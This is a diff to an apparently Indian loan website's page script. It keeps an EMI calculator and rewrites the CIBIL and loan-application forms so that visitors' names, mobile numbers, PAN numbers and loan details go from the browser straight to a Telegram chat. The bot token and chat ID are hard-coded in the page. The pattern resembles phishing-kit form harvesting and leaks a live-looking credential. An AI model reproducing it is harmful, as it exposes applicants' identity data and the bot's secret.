@@ -379,84 +379,77 @@
        target="_blank" 
        class="fixed bottom-6 right-6 z-50 bg-emerald-500 hover:bg-emerald-600 text-white w-14 h-14 rounded-full flex items-center justify-center text-3xl shadow-2xl shadow-emerald-500/50 transition transform hover:scale-110">
         <i class="fa-brands fa-whatsapp"></i>
-    </a>
+    </a><script>
+    // 1. EMI Calculator Logic
+    const amountSlider = document.getElementById('loanAmount');
+    const rateSlider = document.getElementById('interestRate');
+    const tenureSlider = document.getElementById('tenureYears');
 
-    <!-- SCRIPTS -->
-    <script>
-        // 1. EMI Calculator Logic
-        const amountSlider = document.getElementById('loanAmount');
-        const rateSlider = document.getElementById('interestRate');
-        const tenureSlider = document.getElementById('tenureYears');
+    function updateEMI() {
+        const P = parseFloat(amountSlider.value);
+        const r = parseFloat(rateSlider.value) / 12 / 100;
+        const n = parseFloat(tenureSlider.value) * 12;
 
-        function updateEMI() {
-            const P = parseFloat(amountSlider.value);
-            const r = parseFloat(rateSlider.value) / 12 / 100;
-            const n = parseFloat(tenureSlider.value) * 12;
+        document.getElementById('amountVal').innerText = '₹ ' + P.toLocaleString('en-IN');
+        document.getElementById('interestVal').innerText = rateSlider.value + '%';
+        document.getElementById('tenureVal').innerText = tenureSlider.value + ' Years';
 
-            document.getElementById('amountVal').innerText = '₹ ' + P.toLocaleString('en-IN');
-            document.getElementById('interestVal').innerText = rateSlider.value + '%';
-            document.getElementById('tenureVal').innerText = tenureSlider.value + ' Years';
+        const emi = (P * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
+        const totalPayable = emi * n;
+        const totalInterest = totalPayable - P;
 
-            const emi = (P * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
-            const totalPayable = emi * n;
-            const totalInterest = totalPayable - P;
+        document.getElementById('monthlyEmiDisplay').innerText = '₹ ' + Math.round(emi).toLocaleString('en-IN');
+        document.getElementById('totalInterestDisplay').innerText = '₹ ' + Math.round(totalInterest).toLocaleString('en-IN');
+        document.getElementById('totalPayableDisplay').innerText = '₹ ' + Math.round(totalPayable).toLocaleString('en-IN');
+    }
 
-            document.getElementById('monthlyEmiDisplay').innerText = '₹ ' + Math.round(emi).toLocaleString('en-IN');
-            document.getElementById('totalInterestDisplay').innerText = '₹ ' + Math.round(totalInterest).toLocaleString('en-IN');
-            document.getElementById('totalPayableDisplay').innerText = '₹ ' + Math.round(totalPayable).toLocaleString('en-IN');
+    amountSlider.addEventListener('input', updateEMI);
+    rateSlider.addEventListener('input', updateEMI);
+    tenureSlider.addEventListener('input', updateEMI);
+    updateEMI();
+
+    // টেলিগ্রাম সেটিংস (আপনার টোকেন ও চ্যাট আইডি নিচে বসান)
+    const TELEGRAM_BOT_TOKEN = "8794394061:AAG5yDYYYHNhqlOWpJlhTPg-VwdNGscwiWo";
+    const TELEGRAM_CHAT_ID = "8876967054";
+
+    // টেলিগ্রাম পাঠানোর ফাংশন
+    function notifyTelegram(msg) {
+        if (TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE") {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+            fetch(url).catch(err => console.log('Telegram send error:', err));
         }
+    }
 
-        amountSlider.addEventListener('input', updateEMI);
-        rateSlider.addEventListener('input', updateEMI);
-        tenureSlider.addEventListener('input', updateEMI);
-        updateEMI();
+    // 2. CIBIL Form Submit
+    document.getElementById('heroCibilForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const name = document.getElementById('cibil_name').value;
+        const mobile = document.getElementById('cibil_mobile').value;
+        const pan = document.getElementById('cibil_pan').value;
 
-        // 2. CIBIL Form Submit
-        document.getElementById('heroCibilForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const data = {
-                type: "CIBIL Report Request",
-                name: document.getElementById('cibil_name').value,
-                mobile: document.getElementById('cibil_mobile').value,
-                pan: document.getElementById('cibil_pan').value
-            };
-            try {
-                await fetch('/api/register', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
-                });
-                document.getElementById('cibilMsg').innerText = "✓ CIBIL Request submitted successfully!";
-                document.getElementById('cibilMsg').classList.remove('hidden');
-                document.getElementById('heroCibilForm').reset();
-            } catch(e) {
-                alert('Request saved.');
-            }
-        });
+        const alertText = `🚀 *NEW CIBIL REPORT REQUEST!* 🚀\n\n👤 *Name:* ${name}\n📞 *Mobile:* ${mobile}\n💳 *PAN:* ${pan}\n⏰ *Time:* ${new Date().toLocaleString("en-IN")}`;
+        notifyTelegram(alertText);
 
-        // 3. Loan Application Submit
-        document.getElementById('loanApplyForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const data = {
-                type: "Loan Registration",
-                name: document.getElementById('loan_name').value,
-                mobile: document.getElementById('loan_mobile').value,
-                loanPlan: document.getElementById('loan_type').value,
-                reqAmount: document.getElementById('loan_amount').value,
-                employment: document.getElementById('loan_emp').value
-            };
-            try {
-                await fetch('/api/register', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
-                });
-                document.getElementById('loanSuccessMsg').classList.remove('hidden');
-                document.getElementById('loanApplyForm').reset();
-            } catch(e) {
-                alert('Application saved.');
-            }
-        });
-    </script>
+        document.getElementById('cibilMsg').innerText = "✓ CIBIL Request submitted successfully!";
+        document.getElementById('cibilMsg').classList.remove('hidden');
+        document.getElementById('heroCibilForm').reset();
+    });
+
+    // 3. Loan Application Submit
+    document.getElementById('loanApplyForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const name = document.getElementById('loan_name').value;
+        const mobile = document.getElementById('loan_mobile').value;
+        const loanPlan = document.getElementById('loan_type').value;
+        const reqAmount = document.getElementById('loan_amount').value;
+        const employment = document.getElementById('loan_emp').value;
+
+        const alertText = `🚀 *NEW LOAN APPLICATION!* 🚀\n\n👤 *Name:* ${name}\n📞 *Mobile:* ${mobile}\n💼 *Loan Type:* ${loanPlan}\n💰 *Amount:* ₹${Number(reqAmount).toLocaleString('en-IN')}\n🏢 *Profile:* ${employment}\n⏰ *Time:* ${new Date().toLocaleString("en-IN")}`;
+        notifyTelegram(alertText);
+
+        document.getElementById('loanSuccessMsg').classList.remove('hidden');
+        document.getElementById('loanApplyForm').reset();
+    });
+</script>
 </body>
 </html>
